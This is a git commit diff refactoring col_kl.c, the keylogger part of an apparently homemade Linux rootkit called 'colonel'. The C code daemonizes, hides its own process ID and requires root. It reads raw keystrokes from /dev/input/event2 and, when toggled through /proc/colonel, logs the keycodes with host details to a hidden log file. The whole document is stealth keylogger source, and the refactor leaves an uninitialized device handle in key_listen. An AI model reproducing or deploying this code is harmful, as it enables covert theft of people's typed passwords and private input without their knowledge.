d25e0ff0b7fc604a42419b29e93a4b0308c4b19a
cara marie <cara.marie@me.com>
2013-08-13 22:06:09 -0700

    refactored. needs testing. vagrant out -- parallels in.

--- col_kl.c
+++ col_kl.c
@@ -15,7 +15,7 @@
 #include <stdarg.h>
 
 FILE *error_log = NULL;									/* error log */
-
+FILE *evlog;									/* device input log */
 
 void daemonize(void) {
 	pid_t process_id = 0;
@@ -70,20 +70,81 @@ int hide_pid(void) {
 	return 0;
 }
 
-int main(void) {
-	FILE *evlog;									/* device input log */
-	int control_file;
-	int input_device;								/* will read from device event file */
-	int dir;									/* log directory */
+int is_root(void) {
+	time_t curtime;
+	time(&curtime);									/* set the current time */
+	if (geteuid() != 0) {								/* check if user is root */
+		fprintf(error_log, "ERROR: user not root -- %s", ctime(&curtime));
+		exit(1);
+	}
+	return 0;
+}
+
+int system_timestamp(void) {
 	struct utsname unameData;							/* struct provides system information */
 	uname(&unameData);								/* provides system information */
+	time_t curtime;
+	time(&curtime);									/* set the current time */
+	fprintf(evlog, "\n\n%s", ctime(&curtime));		        /* timestamp */
+	fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 	                /* system data */
+		unameData.nodename, unameData.version,
+		unameData.sysname, unameData.release, 
+		unameData.machine);
+	fflush(evlog);
+	fprintf(error_log, "Begin listening -- %s", ctime(&curtime));
+	return 0;
+}
+
+int key_listen(void) {
+	int control_file;
+	int input_device;								/* will read from device event file */
 	char listening = 1;								/* toggles keylogger on/off */
 	char cmd[1024];									/* stores commands */
-	char kl[13] = "keylogger: 1";							/* defines what keylogger is listening for on /proc/colonel */
+	char kl[13] = "keylogger: 0";							/* defines what keylogger is listening for on /proc/colonel */
 	char *toggle;									/* listens for keylogger cmd */
 	struct input_event ev;								/* using input_event so we know what we're reading from the event file */
 	time_t curtime;
+	time(&curtime);									/* set the current time */
+	
+	while(1) {				
+		fflush(error_log);
+		read(input_device, &ev, sizeof(struct input_event));	                /* read from /dev/input/eventX */
+		control_file = open("/proc/colonel", O_RDONLY);                         /* read from /proc/colonel */
+		read(control_file, cmd, sizeof(cmd));			                /* read from /proc/colonel */
+		toggle = strstr(cmd, kl);				                /* looks for change in /proc/colonel */
 
+		if ((0 == listening) && (toggle != NULL)) {
+			listening = !listening;
+        		evlog = fopen("./col_log/evlog.txt", "a+");          		/* key log */
+            		if (NULL == evlog) {
+                		fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
+                		exit(1);
+            		}	
+			system_timestamp();
+			close(control_file);
+			continue;
+
+		} else if ((1 == ev.type) && (1 == listening)) {	                /* if typing (ev.type = 1) and keylogger is on */
+            		fprintf(evlog, "%i,%i-", ev.code, ev.value);         		/* grabs keyboard input -- 
+											 * ev.code = keycode, ev.value = key state (0: key up, 1: key down) */
+			fflush(evlog);
+			control_file = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
+			if (NULL == toggle) {
+				listening = !listening;
+                		fclose(evlog);
+				fprintf(error_log, "End listening -- %s", ctime(&curtime));
+				close(control_file);
+				continue;
+			}
+		}
+	}
+	fclose(evlog);
+	return 0;
+}
+
+int main(void) {
+	int input_device;								/* will read from device event file */
+	
 	daemonize();
 	setup_dirs();
 
@@ -91,69 +152,9 @@ int main(void) {
 	input_device = open("/dev/input/event2", O_RDONLY);			        /* key event file */
 
 	hide_pid();
-
-	fprintf(error_log, "I'M AWAKE!!! -- listening: %d", listening);
-
-
-	fprintf(error_log, "NO ERRORS FOR YOU! -- listening: %d", listening);
+	is_root();
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
-/*
-* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
-*/	fprintf(error_log, "NOT ROOT! -- listening: %d", listening);
-	if (geteuid() != 0) {								/* check if user is root */
-		fprintf(error_log, "ERROR: user not root -- %s", ctime(&curtime));
-		return 1;
-	}
-    fprintf(error_log, "JUST KIDDING, NOT WHILE -- listening: %d", listening);
-	while(1) {				
-		fflush(error_log);
-		read(input_device, &ev, sizeof(struct input_event));	                /* read from /dev/input/eventX */
-		control_file = open("/proc/colonel", O_RDONLY);                         /* read from /proc/colonel */
-		read(control_file, cmd, sizeof(cmd));			                /* read from /proc/colonel */
-		toggle = strstr(cmd, kl);				                /* looks for change in /proc/colonel */
-        fprintf(error_log, "In while (no if), control_file open and reading -- listening: %d, toggle: %s", listening, toggle);
-
-		if ((0 == listening) && (toggle != NULL)) {
-            fprintf(error_log, "In 1st if -- listening: %d, toggle: %s", listening, toggle);
-			listening = !listening;
-            evlog = fopen("./col_log/evlog.txt", "a+");                       		/* key log */
-            if (NULL == evlog) {
-                fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
-                return 1;
-            }
-			fprintf(evlog, "\n\n%s", ctime(&curtime));		        /* timestamp */
-			fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 	                /* system data */
-					unameData.nodename, unameData.version,
-					unameData.sysname, unameData.release, 
-					unameData.machine);
-			fflush(evlog);
-			fprintf(error_log, "Begin listening -- %s", ctime(&curtime));
-			close(control_file);
-            fprintf(error_log, "Leaving 1st if, control_file closed -- listening: %d, toggle: %s", listening, toggle);
-			continue;
-
-		} else if ((1 == ev.type) && (1 == listening)) {	                /* if typing (ev.type = 1) and keylogger is on */
-			fprintf(error_log, "In 2nd if, control_file still closed -- listening: %d, toggle: %s", listening, toggle);
-            fprintf(evlog, "%i,%i-", ev.code, ev.value);	              		/* grabs keyboard input -- ev.code = keycode, ev.value = key state (0: key up, 1: key down) */
-			fflush(evlog);
-
-			control_file = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
-            fprintf(error_log, "In bottom of 2nd if, control_file open and non-blocking -- listening: %d, toggle: %s", listening, toggle);
-			if (NULL == toggle) {
-				listening = !listening;
-                fclose(evlog);
-				fprintf(error_log, "End listening -- %s", ctime(&curtime));
-				// fprintf(evlog, "\nEnd listening | %s", ctime(&curtime));
-				// fflush(evlog);
-                fprintf(error_log, "In nested if, control_file open -- listening: %d, toggle: %s", listening, toggle);
-				close(control_file);
-                fprintf(error_log, "In nested if, control_file closed -- listening: %d, toggle: %s", listening, toggle);
-				continue;
-			}
-		}
-	}
-
-	fclose(evlog);
+	key_listen();	
 	fclose(error_log);
 	return 0;
 }
